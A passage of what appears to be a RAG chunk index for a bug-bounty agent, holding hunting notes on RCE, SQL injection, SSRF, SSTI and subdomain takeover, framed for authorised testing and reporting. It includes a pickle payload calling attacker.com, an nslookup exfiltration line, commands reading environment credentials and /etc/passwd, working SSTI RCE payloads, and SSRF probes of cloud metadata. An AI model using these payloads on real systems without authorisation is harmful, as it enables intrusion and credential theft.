+    "doc_id": "rag\\vulnerabilities\\rce.md",
+    "text": "_reduce__(self): return (os.system, ('nslookup attacker.com',))\n```\n\n---\n\n## 3. File Upload → RCE\n\n**Required Conditions:**\n1. Can upload a file with attacker-controlled content\n2. File is accessible at a predictable/discoverable URL\n3. Server executes the uploaded file type (PHP, JSP, ASP, py)\n\n**Attack Steps:**\n1. Upload a PHP file (e.g., `shell.php`) containing a minimal code execution payload — a one-liner that passes a GET parameter to an OS command function (`system()`, `passthru()`, or `shell_exec()`). Exact working payloads: HackTricks \"File Upload\" or PayloadsAllTheThings \"File Upload\".\n2. Find where the file is stored (observe URL in response, brute predictable path)\n3. Access `https://target.com/uploads/shell.php?cmd=id`\n\n**File Extension Bypass Techniques:**\n- Double extension: `shell.php.jpg`\n- Null byte: `shell.php%00.jpg` (older PHP)\n- MIME confusion: send `image/jpeg` content-type with PHP content\n- Capitalization: `shell.PHP`, `shell.Php`\n- Less common ext: `.phtml`, `",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 3,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\rce.md",
+        "mtime": 1775393895.2846246,
+        "size": 6125,
+        "hash": "ffbc2f568704db1af0bcaef3b3e191ca23b4041c790208472d92b92d237406c9"
+      }
+    }
+  },
+  "7989965879434266048": {
+    "chunk_id": "rag\\vulnerabilities\\rce.md::chunk::4",
+    "doc_id": "rag\\vulnerabilities\\rce.md",
+    "text": "ization: `shell.PHP`, `shell.Php`\n- Less common ext: `.phtml`, `.php5`, `.phar`\n\n**If no direct execution path:** Check if files are served through a PHP include or template engine that interprets them.\n\n---\n\n## 4. Template Injection → RCE\n\nSee `references/vulnerabilities/ssti.md` for full SSTI methodology. SSTI commonly escalates to RCE — use this path when template injection is confirmed.\n\n---\n\n## Impact Classification\n\n| RCE Type | Severity |\n|---|---|\n| Unauthenticated OS command injection | Critical |\n| Authenticated OS command injection (any user) | High-Critical |\n| Deserialization RCE | Critical |\n| File upload shell execution | Critical |\n| RCE requiring admin login | High |\n| Blind RCE (confirmed via OOB but no output) | High-Critical |\n\n## Do Not Report\n- Command injection in admin-only panels if only admins could ever reach it (check program scope)\n- Injection that's filtered completely — test the bypass first\n- File upload without confirmed execution path (LFI + upload is ",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 4,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\rce.md",
+        "mtime": 1775393895.2846246,
+        "size": 6125,
+        "hash": "ffbc2f568704db1af0bcaef3b3e191ca23b4041c790208472d92b92d237406c9"
+      }
+    }
+  },
+  "7639565543405199674": {
+    "chunk_id": "rag\\vulnerabilities\\rce.md::chunk::5",
+    "doc_id": "rag\\vulnerabilities\\rce.md",
+    "text": "- File upload without confirmed execution path (LFI + upload is a separate chain)\n\n## Evidence Requirements for RCE Reports\nRCE is the highest severity — triagers expect:\n1. **Exact vulnerable endpoint and parameter**\n2. **Payload that triggers execution** (blind: OOB DNS; non-blind: `id` output)\n3. **Full HTTP request** with payload\n4. **Response or OOB evidence** proving execution\n   - Blind RCE: use Burp Collaborator or [interactsh](https://github.com/projectdiscovery/interactsh) (free) — `; nslookup $(whoami).YOUR-INTERACTSH-HOST`\n5. **Impact statement:** \"Attacker achieves arbitrary code execution as [OS user] on [server]\"\n\n## Post-RCE: Maximizing Impact Evidence\nOnce RCE is confirmed, collect these for your report to justify Critical severity:\n- `id` — confirm OS user (root vs www-data changes severity framing)\n- `cat /proc/self/environ` — environment variables, may contain cloud credentials\n- `env | grep -i aws` — AWS keys if running in cloud environment\n- `cat /etc/passwd` — us",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 5,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\rce.md",
+        "mtime": 1775393895.2846246,
+        "size": 6125,
+        "hash": "ffbc2f568704db1af0bcaef3b3e191ca23b4041c790208472d92b92d237406c9"
+      }
+    }
+  },
+  "7658133502074406229": {
+    "chunk_id": "rag\\vulnerabilities\\rce.md::chunk::6",
+    "doc_id": "rag\\vulnerabilities\\rce.md",
+    "text": "WS keys if running in cloud environment\n- `cat /etc/passwd` — user list (shows server context)\n- `cat /proc/net/fib_trie` — internal IP ranges (demonstrates network access)\n- `ls /home` — other user directories\n\nStop after confirming RCE — do NOT access production data, customer files, or modify anything.\n",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 6,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\rce.md",
+        "mtime": 1775393895.2846246,
+        "size": 6125,
+        "hash": "ffbc2f568704db1af0bcaef3b3e191ca23b4041c790208472d92b92d237406c9"
+      }
+    }
+  },
+  "2711236515900116012": {
+    "chunk_id": "rag\\vulnerabilities\\sqli.md::chunk::0",
+    "doc_id": "rag\\vulnerabilities\\sqli.md",
+    "text": "# SQL Injection — Hunting Methodology\n\n## Types to Hunt\n\n| Type | Description | Priority |\n|---|---|---|\n| Classic / Error-based | DB error leaks query structure | High |\n| Blind Boolean | Behavior changes based on true/false conditions | High |\n| Blind Time-based | `SLEEP()` / `WAITFOR DELAY` to confirm | High |\n| Second-order | Input stored, then used unsafely later | High |\n| ORM misuse | Raw query methods bypassing ORM protection | High |\n\n## Finding Injection Points\n\nLook for these patterns in source code or HTTP traffic:\n\n**High-risk parameters:**\n- `?id=`, `?user_id=`, `?order=`, `?sort=`, `?search=`, `?category=`\n- Any parameter that correlates to a DB lookup result\n\n**Source code red flags:**\n- `query = \"SELECT ... WHERE id = \" + input`\n- `cursor.execute(\"... WHERE user = '%s'\" % input)`\n- `.raw()`, `.extra()`, `.RawSQL()` in Django ORM\n- `DB::select(\"... '$input'...\")` in Laravel\n- `$conn->query(\"... $input...\")` in PHP\n- String interpolation in any query construction\n\n## Def",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 0,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\sqli.md",
+        "mtime": 1775393895.2846246,
+        "size": 3121,
+        "hash": "27cfcb2b1a8d547a9cc16fe41e76816779fe478277f6f1757f2122337514bc4c"
+      }
+    }
+  },
+  "4744195413229767295": {
+    "chunk_id": "rag\\vulnerabilities\\sqli.md::chunk::1",
+    "doc_id": "rag\\vulnerabilities\\sqli.md",
+    "text": " in PHP\n- String interpolation in any query construction\n\n## Defense Verification\n\nConfirm the following are NOT present before reporting:\n\n| Defense | How to Confirm Absent |\n|---|---|\n| Prepared statements | No `?` or `:name` placeholders in query construction |\n| ORM parameterization | Not using `.filter()`, `.where()` with value args — using raw string concat instead |\n| Stored procedures (safe) | Not using `EXEC (@userInput)` style dynamic SQL in procs |\n| Input type casting | `(int)$id` before use in query — numeric injection impossible |\n\n## Confirmation Payloads (suggest to user)\n\nFor suspected SQLi endpoints, user should try:\n\n**Boolean test (compare responses):**\n- True: `1 AND 1=1`\n- False: `1 AND 1=2`\nIf responses differ → Boolean SQLi confirmed\n\n**Error-based:**\n- `'` (single quote) — look for database error\n- `''` (two quotes) — should return normal response\nError on `'` + normal on `''` → high confidence\n\n**Time-based (as last resort):**\n- MySQL: `1 AND SLEEP(5)`\n- MSSQL",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 1,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\sqli.md",
+        "mtime": 1775393895.2846246,
+        "size": 3121,
+        "hash": "27cfcb2b1a8d547a9cc16fe41e76816779fe478277f6f1757f2122337514bc4c"
+      }
+    }
+  },
+  "5904127056204422674": {
+    "chunk_id": "rag\\vulnerabilities\\sqli.md::chunk::2",
+    "doc_id": "rag\\vulnerabilities\\sqli.md",
+    "text": "Time-based (as last resort):**\n- MySQL: `1 AND SLEEP(5)`\n- MSSQL: `1; WAITFOR DELAY '0:0:5'--`\n- PostgreSQL: `1; SELECT pg_sleep(5)--`\n\n## Impact Assessment\n\n| Scenario | Impact |\n|---|---|\n| `SELECT` injection | Data exfiltration — HIGH |\n| `UPDATE/INSERT` | Data modification — HIGH |\n| Auth bypass (`' OR '1'='1`) | Account takeover — CRITICAL |\n| UNION-based on auth endpoint | Full DB dump — CRITICAL |\n| Stacked queries + file write | RCE — CRITICAL |\n| Read-only DB user confirmed | High → downgrade to Medium |\n\n## Second-Order SQLi\n\nInput is stored safely then later used in an unsafe query:\n1. Register with username: `admin'--`\n2. Later operation uses username in a new query unsafely\n3. Result: SQLi triggers in different context\n\nCheck: any stored data (usernames, addresses, titles) that is later used in search, admin panels, or audit logs.\n\n## Do Not Report If\n- Prepared statements are used throughout (confirmed in code)\n- Input is cast to integer/typed before query use\n- ORM param",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 2,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\sqli.md",
+        "mtime": 1775393895.2846246,
+        "size": 3121,
+        "hash": "27cfcb2b1a8d547a9cc16fe41e76816779fe478277f6f1757f2122337514bc4c"
+      }
+    }
+  },
+  "7351339351679963597": {
+    "chunk_id": "rag\\vulnerabilities\\sqli.md::chunk::3",
+    "doc_id": "rag\\vulnerabilities\\sqli.md",
+    "text": "e)\n- Input is cast to integer/typed before query use\n- ORM parameterized methods are used (not raw query methods)\n- Error messages are suppressed and time-based is not confirmed with user-provided output\n",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 3,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\sqli.md",
+        "mtime": 1775393895.2846246,
+        "size": 3121,
+        "hash": "27cfcb2b1a8d547a9cc16fe41e76816779fe478277f6f1757f2122337514bc4c"
+      }
+    }
+  },
+  "7733007403133301439": {
+    "chunk_id": "rag\\vulnerabilities\\ssrf.md::chunk::0",
+    "doc_id": "rag\\vulnerabilities\\ssrf.md",
+    "text": "# SSRF — Server-Side Request Forgery Hunting Methodology\n\n## High-Value SSRF Targets\n\n| Target | Impact |\n|---|---|\n| Cloud IMDS ([cloud-imds-ip]) | AWS/GCP/Azure credentials → full account takeover |\n| Internal services (localhost:port) | Access to admin UIs, databases, Elasticsearch |\n| Internal network scan | Network topology disclosure |\n| File scheme (file://) | Local file read |\n| DNS rebinding | Bypass IP allowlists |\n\n## Finding SSRF Entry Points\n\nParameters that accept URLs or fetch content on behalf of user:\n\n- Webhooks: `callback_url`, `webhook`, `notify_url`\n- Import features: `url`, `file_url`, `import_from`, `fetch_url`\n- Image/media: `avatar_url`, `image_url`, `thumbnail`, `preview`\n- Proxy-style: `proxy`, `next`, `redirect_to`, `destination`\n- PDF/screenshot generators: page URL parameters\n- Integration setup: `endpoint`, `slack_webhook`, `api_endpoint`\n- XML/JSON imports with external entities\n\n## Confirmation Payloads (suggest to user)\n\n**Step 1 — prove outbound reque",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 0,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\ssrf.md",
+        "mtime": 1775393895.2846246,
+        "size": 3309,
+        "hash": "289290e651b1c9284f309027ce06593c55d55f7cc60b7ef4f968c4c5b2a10d5b"
+      }
+    }
+  },
+  "6411801692647698694": {
+    "chunk_id": "rag\\vulnerabilities\\ssrf.md::chunk::1",
+    "doc_id": "rag\\vulnerabilities\\ssrf.md",
+    "text": "tion Payloads (suggest to user)\n\n**Step 1 — prove outbound request:**\nUse collaborator/interactsh/webhook.site URL and check for DNS lookup + HTTP request.\n\nExample: `url=https://YOUR-COLLABORATOR-ID.oast.pro`\n\nIf DNS/HTTP request received → SSRF confirmed (at minimum blind SSRF).\n\n**Step 2 — escalate to internal (suggest):**\n- `url=http://[cloud-imds-ip]/latest/meta-data/` (AWS IMDSv1)\n- `url=http://metadata.google.internal/computeMetadata/v1/` (GCP — needs header)\n- `url=http://[cloud-imds-ip]/metadata/instance?api-version=2021-02-01` (Azure)\n- `url=http://localhost:6379/` (Redis)\n- `url=http://localhost:27017/` (MongoDB)\n- `url=http://internal.admin/`\n\nIf app returns internal content in response → Full SSRF confirmed.\n\n**Step 3 — try file scheme:**\n- `url=file:///etc/passwd`\n- `url=file:///proc/self/environ`\n\n## Defense Bypasses to Test\n\nIf direct IP is blocked, suggest trying:\n\n- Decimal IP: `http://2130706433/` = `http://127.0.0.1/`\n- Hex IP: `http://0x7f000001/`  \n- IPv6: `http:/",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 1,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\ssrf.md",
+        "mtime": 1775393895.2846246,
+        "size": 3309,
+        "hash": "289290e651b1c9284f309027ce06593c55d55f7cc60b7ef4f968c4c5b2a10d5b"
+      }
+    }
+  },
+  "1060144329065245518": {
+    "chunk_id": "rag\\vulnerabilities\\ssrf.md::chunk::2",
+    "doc_id": "rag\\vulnerabilities\\ssrf.md",
+    "text": "p://127.0.0.1/`\n- Hex IP: `http://0x7f000001/`  \n- IPv6: `http://[::1]/`\n- DNS-based: create a DNS record pointing to 127.0.0.1\n- URL encoding: `http://127.0.0.1%09.evil.com/`\n- Protocol confusion: `gopher://`, `dict://`, `sftp://`\n\n## Reportability Threshold\n\n| Confirmed Impact | Severity |\n|---|---|\n| AWS IMDS v1 credential access | Critical |\n| Internal admin panel access | High |\n| Internal port scanning with response | High |\n| Blind SSRF (DNS only, no response body) | Medium |\n| Blind SSRF (no internal access confirmed) | Low–Medium |\n| External-only SSRF to public IPs | Low / Informational |\n\n**Blind SSRF is reportable at Medium if internal network is the likely target.** Do not claim Critical for blind SSRF alone.\n\n## IMDSv2 Protection\n\nAWS IMDSv2 requires a PUT request with a token first — not exploitable via SSRF alone (SSRFs are typically GET only). If target is on AWS, check if IMDSv2 is enforced before claiming Critical.\n\n> **Note:** `[cloud-imds-ip]` throughout this file ",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 2,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\ssrf.md",
+        "mtime": 1775393895.2846246,
+        "size": 3309,
+        "hash": "289290e651b1c9284f309027ce06593c55d55f7cc60b7ef4f968c4c5b2a10d5b"
+      }
+    }
+  },
+  "4321849383628711860": {
+    "chunk_id": "rag\\vulnerabilities\\ssrf.md::chunk::3",
+    "doc_id": "rag\\vulnerabilities\\ssrf.md",
+    "text": "g Critical.\n\n> **Note:** `[cloud-imds-ip]` throughout this file refers to the cloud Instance Metadata Service link-local address used by AWS, GCP, and Azure. The specific IP is documented in each provider's official documentation.\n\n`curl -X PUT \"http://[cloud-imds-ip]/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"`\n\nIf 403 on PUT → IMDSv2 enforced → downgrade from Critical.\n",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 3,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\ssrf.md",
+        "mtime": 1775393895.2846246,
+        "size": 3309,
+        "hash": "289290e651b1c9284f309027ce06593c55d55f7cc60b7ef4f968c4c5b2a10d5b"
+      }
+    }
+  },
+  "6953388577420226748": {
+    "chunk_id": "rag\\vulnerabilities\\ssti.md::chunk::0",
+    "doc_id": "rag\\vulnerabilities\\ssti.md",
+    "text": "# SSTI — Server-Side Template Injection Hunting Methodology\n\n## What Is SSTI\n\nUser-supplied input is embedded into a server-side template and evaluated by the template engine, allowing arbitrary code execution in the server's context.\n\n## Affected Template Engines\n\n| Engine | Language | RCE Potential |\n|---|---|---|\n| Jinja2 | Python | Yes — `__class__.__mro__` chains |\n| Twig | PHP | Yes — `_self.env.registerUndefinedFilterCallback` |\n| Freemarker | Java | Yes — `freemarker.template.utility.Execute` |\n| Pebble | Java | Yes — via `ClassUtil` |\n| Velocity | Java | Yes — via `ClassTool` |\n| Smarty | PHP | Yes — `{php}` tag |\n| Handlebars (server-side) | Node.js | Limited — prototype pollution chains |\n| ERB | Ruby | Yes — `<%= system(\"id\") %>` |\n| Mako | Python | Yes — `${__import__('os').system('id')}` |\n\n## Finding SSTI\n\n**Where user input renders as dynamic content:**\n- Error messages that reflect input (\"Hello, [user input]!\")\n- Profile names, bios, display names\n- Email templates (n",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 0,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\ssti.md",
+        "mtime": 1775393895.2859168,
+        "size": 3362,
+        "hash": "795a7c6610ac5df2a347330d16dc2ef88c38cb515e5329591e87df9c0c284b00"
+      }
+    }
+  },
+  "1147241846595648744": {
+    "chunk_id": "rag\\vulnerabilities\\ssti.md::chunk::1",
+    "doc_id": "rag\\vulnerabilities\\ssti.md",
+    "text": "ut]!\")\n- Profile names, bios, display names\n- Email templates (name field in \"Dear {name}\")\n- Search results that echo the query back\n- PDF/report generators that incorporate user content\n- Custom message or notification templates\n\n## SSTI Detection Probe Sequence\n\n**Step 1 — Mathematical expression test:**\n- Input: `{{7*7}}` → If `49` appears in response: **Jinja2/Twig/similar confirmed**\n- Input: `${7*7}` → If `49`: **Freemarker/Velocity/Mako/ERB**\n- Input: `#{7*7}` → If `49`: **Ruby ERB / Pebble**\n- Input: `<%= 7*7 %>` → If `49`: **ERB**\n\n**Step 2 — Engine identification:**\n- `{{7*'7'}}` → `7777777` = Jinja2 | `49` = Twig\n- `{{\"a\".toUpperCase()}}` → `A` = Twig (PHP)\n\n**Step 3 — Escalate to RCE:**\n\n*Jinja2 (Python):*\n```\n{{''.__class__.__mro__[1].__subclasses__()[372]('id',shell=True,stdout=-1).communicate()[0]}}\n```\nOr simpler (if `os` accessible):\n```\n{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n```\n\n*Twig (PHP):*\n```\n{{_self.env.registerUndefinedFilterCallbac",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 1,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\ssti.md",
+        "mtime": 1775393895.2859168,
+        "size": 3362,
+        "hash": "795a7c6610ac5df2a347330d16dc2ef88c38cb515e5329591e87df9c0c284b00"
+      }
+    }
+  },
+  "2679740077033766607": {
+    "chunk_id": "rag\\vulnerabilities\\ssti.md::chunk::2",
+    "doc_id": "rag\\vulnerabilities\\ssti.md",
+    "text": "``\n\n*Twig (PHP):*\n```\n{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}\n```\n\n*Freemarker (Java):*\n```\n<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}\n```\n\n*Mako (Python):*\n```\n${__import__('os').popen('id').read()}\n```\n\n*ERB (Ruby):*\n```\n<%= `id` %>\n```\n\n## Context Escape First\n\nIf the template uses `{{ user_input }}` but the page shows the literal `{{7*7}}` as text, the engine may be X-encoding output. Try:\n- Putting the injection IN a URL parameter that's reflected differently\n- Injecting in different fields (email vs username vs bio)\n- Injecting where the value is used in a backend process (report generation, email send)\n\n## Confidence Levels\n\n| Signal | Confidence |\n|---|---|\n| `{{7*7}}` → `49` in response | Probable |\n| Engine-specific payload returns code output | Confirmed |\n| OOB DNS from template payload | Confirmed (Blind SSTI) |\n| Mathematical expression echoed literally | Low - likely escaping |\n\n## Impact\n\nSSTI → RCE on ",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 2,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\ssti.md",
+        "mtime": 1775393895.2859168,
+        "size": 3362,
+        "hash": "795a7c6610ac5df2a347330d16dc2ef88c38cb515e5329591e87df9c0c284b00"
+      }
+    }
+  },
+  "6054846641203704283": {
+    "chunk_id": "rag\\vulnerabilities\\ssti.md::chunk::3",
+    "doc_id": "rag\\vulnerabilities\\ssti.md",
+    "text": "d literally | Low - likely escaping |\n\n## Impact\n\nSSTI → RCE on the server running the template engine. Severity: **Critical** if reachable by any user, **High** if requires specific role.\n\n## Evidence Required\n1. The template injection probe (`{{7*7}}` → `49`)\n2. Engine identified (Jinja2 / Twig / Freemarker etc.)\n3. RCE payload with output (or OOB DNS for blind)\n4. HTTP request + response showing execution\n",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 3,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\ssti.md",
+        "mtime": 1775393895.2859168,
+        "size": 3362,
+        "hash": "795a7c6610ac5df2a347330d16dc2ef88c38cb515e5329591e87df9c0c284b00"
+      }
+    }
+  },
+  "2895230689830717216": {
+    "chunk_id": "rag\\vulnerabilities\\subdomain-takeover.md::chunk::0",
+    "doc_id": "rag\\vulnerabilities\\subdomain-takeover.md",
+    "text": "# Subdomain Takeover — Hunting Methodology\n\n## What Is Subdomain Takeover\n\nA subdomain (`sub.target.com`) has a DNS record (CNAME or A) pointing to an external service that the target no longer controls. An attacker can claim that external service and then serve content under `sub.target.com`, enabling phishing, cookie theft, or bypassing CORS/CSP policies that trust `*.target.com`.\n\n---\n\n## How It Happens\n\n```\nsub.target.com  CNAME  oldapp.github.io\n```\nTarget stopped using GitHub Pages but forgot to remove the DNS record. An attacker claims the GitHub Pages repo `oldapp.github.io` → they control `sub.target.com`.\n\n---\n\n## Phase 1 — Find Dangling Subdomains\n\n**From your passive recon step (recon.md Phase 1B), you already have subdomains. Now check each one:**\n\n**Step 1 — Resolve all subdomains and look for NXDOMAIN or service-specific errors:**\n```bash\ncat subdomains.txt | dnsx -silent -a -resp-only > resolved.txt\n# Subdomains that DON'T resolve = potential dangling CNAME\ncat subdomai",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 0,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\subdomain-takeover.md",
+        "mtime": 1775393895.2859168,
+        "size": 5140,
+        "hash": "9d43045f6bc432940a7da69f6d5c2131110231eea2c9d117280bc6d8c7eb7ea4"
+      }
+    }
+  },
+  "7421673909378250654": {
+    "chunk_id": "rag\\vulnerabilities\\subdomain-takeover.md::chunk::1",
+    "doc_id": "rag\\vulnerabilities\\subdomain-takeover.md",
+    "text": "mains that DON'T resolve = potential dangling CNAME\ncat subdomains.txt | dnsx -silent -cname > cname_records.txt\n```\n\n**Step 2 — Check for service fingerprints in HTTP responses:**\n```bash\nhttpx -l subdomains.txt -title -status-code -o http_probe.txt\n# Look for error pages that match known service fingerprints\n```\n\n---\n\n## Phase 2 — Service Fingerprints\n\nEach external service has a unique error page when the resource doesn't exist. Match these to confirm a takeover opportunity:\n\n| Service | Fingerprint in Response |\n|---|---|\n| **GitHub Pages** | `There isn't a GitHub Pages site here.` |\n| **Heroku** | `No such app` |\n| **AWS S3** | `NoSuchBucket` or `The specified bucket does not exist` |\n| **AWS Elastic Beanstalk** | `404 Not Found` + `Elastic Beanstalk` in Server header |\n| **Azure** | `404 Web Site not found` |\n| **Netlify** | `Not Found - Request ID:` |\n| **Vercel** | `The deployment could not be found` |\n| **Fastly** | `Fastly error: unknown domain` |\n| **Pantheon** | `404 error ",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 1,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\subdomain-takeover.md",
+        "mtime": 1775393895.2859168,
+        "size": 5140,
+        "hash": "9d43045f6bc432940a7da69f6d5c2131110231eea2c9d117280bc6d8c7eb7ea4"
+      }
+    }
+  },
+  "7849291515100942576": {
+    "chunk_id": "rag\\vulnerabilities\\subdomain-takeover.md::chunk::2",
+    "doc_id": "rag\\vulnerabilities\\subdomain-takeover.md",
+    "text": " | `Fastly error: unknown domain` |\n| **Pantheon** | `404 error unknown site!` |\n| **Ghost** | `Domain is not configured` |\n| **Tumblr** | `There's nothing here.` |\n| **Shopify** | `Sorry, this shop is currently unavailable.` |\n| **Zendesk** | `Help Center Closed` |\n| **Cargo** | `If you're moving your domain away from Cargo...` |\n| **Surge.sh** | `project not found` |\n| **Read the Docs** | `unknown to Read the Docs` |\n| **Unbounce** | `The requested URL was not found` (Unbounce fingerprint in headers) |\n\n**Automated tool to suggest:** [subjack](https://github.com/haccer/subjack) or [subzy](https://github.com/PentestPad/subzy):\n```bash\nsubzy run --targets subdomains.txt --concurrency 100 --hide_fails\n```\n\n---\n\n## Phase 3 — Confirm Exploitability\n\nNot all dangling CNAMEs are claimable. Confirm before reporting:\n\n| Service | How to Claim |\n|---|---|\n| GitHub Pages | Create repo matching the CNAME, enable Pages |\n| Heroku | `heroku create <appname>` matching the subdomain |\n| AWS S3 | `aw",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 2,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\subdomain-takeover.md",
+        "mtime": 1775393895.2859168,
+        "size": 5140,
+        "hash": "9d43045f6bc432940a7da69f6d5c2131110231eea2c9d117280bc6d8c7eb7ea4"
+      }
+    }
+  },
+  "2320717372611711902": {
+    "chunk_id": "rag\\vulnerabilities\\subdomain-takeover.md::chunk::3",
+    "doc_id": "rag\\vulnerabilities\\subdomain-takeover.md",
+    "text": "heroku create <appname>` matching the subdomain |\n| AWS S3 | `aws s3api create-bucket --bucket <name>` matching the CNAME |\n| Netlify | Add custom domain pointing to new Netlify site |\n| Fastly | Create new service with the domain in Fastly |\n| Azure | Create Web App with custom domain |\n\n**To prove takeover for the PoC without actually hosting malicious content:**\n1. Claim the service\n2. Host a simple `poc.txt` or HTML with your HackerOne handle and timestamp\n3. Show `https://sub.target.com/poc.txt` → returns your content\n\nNever host anything that could harm users (no phishing pages, no credential-harvesting forms).\n\n---\n\n## Phase 4 — Assess Impact\n\n| Scenario | Severity |\n|---|---|\n| Subdomain used by main app (SSO, OAuth redirect, API) | Critical |\n| Subdomain in CORS/CSP trusted list of main app | Critical (pair with CORS/CSP chain) |\n| Subdomain receives auth cookies due to domain scope | High |\n| Generic marketing subdomain (no auth, no cookies) | Medium |\n| Subdomain in emails/l",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 3,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\subdomain-takeover.md",
+        "mtime": 1775393895.2859168,
+        "size": 5140,
+        "hash": "9d43045f6bc432940a7da69f6d5c2131110231eea2c9d117280bc6d8c7eb7ea4"
+      }
+    }
+  },
+  "8003586369586515616": {
+    "chunk_id": "rag\\vulnerabilities\\subdomain-takeover.md::chunk::4",
+    "doc_id": "rag\\vulnerabilities\\subdomain-takeover.md",
+    "text": "bdomain (no auth, no cookies) | Medium |\n| Subdomain in emails/links used by users | Medium |\n| Unused sandbox/test subdomain with no user exposure | Low |\n\n**High-value chain:** Subdomain takeover + CORS (`ACAO: *.target.com`) = Critical. Document the chain explicitly.\n\n**Also check:** Does the main app set cookies with `Domain=.target.com`? If yes, and you control `sub.target.com`, you can read those cookies via JavaScript → ATO = Critical.\n\n---\n\n## Evidence for Report\n\n1. DNS record showing the dangling CNAME: `dig sub.target.com CNAME`\n2. HTTP response showing the service fingerprint (screenshot or HTTP response)\n3. Proof of claim ability (either show the GitHub repo/Heroku dashboard, or ideally claim it and host the PoC file)\n4. Screenshot of `https://sub.target.com/poc.txt` showing your content\n5. Impact statement: what an attacker could serve on this subdomain\n\n---\n\n## Do Not Report\n- Subdomains resolving to internal IPs (10.x, 192.168.x) without confirmed SSRF/access\n- Expired ",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 4,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\subdomain-takeover.md",
+        "mtime": 1775393895.2859168,
+        "size": 5140,
+        "hash": "9d43045f6bc432940a7da69f6d5c2131110231eea2c9d117280bc6d8c7eb7ea4"
+      }
+    }
+  },
+  "437723472522734243": {
+    "chunk_id": "rag\\vulnerabilities\\subdomain-takeover.md::chunk::5",
+    "doc_id": "rag\\vulnerabilities\\subdomain-takeover.md",
+    "text": "l IPs (10.x, 192.168.x) without confirmed SSRF/access\n- Expired domains where the record is gone (NXDOMAIN with no CNAME = can't take over)\n- Subdomains already returning 200 OK (someone already claimed it, or app still running)\n- Wildcard catch-all A records (`*.target.com → IP`) — you can't selectively takeover\n",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 5,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\subdomain-takeover.md",
+        "mtime": 1775393895.2859168,
+        "size": 5140,
+        "hash": "9d43045f6bc432940a7da69f6d5c2131110231eea2c9d117280bc6d8c7eb7ea4"
+      }
+    }
+  },
+  "3078242469862329323": {
+    "chunk_id": "rag\\vulnerabilities\\xss.md::chunk::0",
+    "doc_id": "rag\\vulnerabilities\\xss.md",
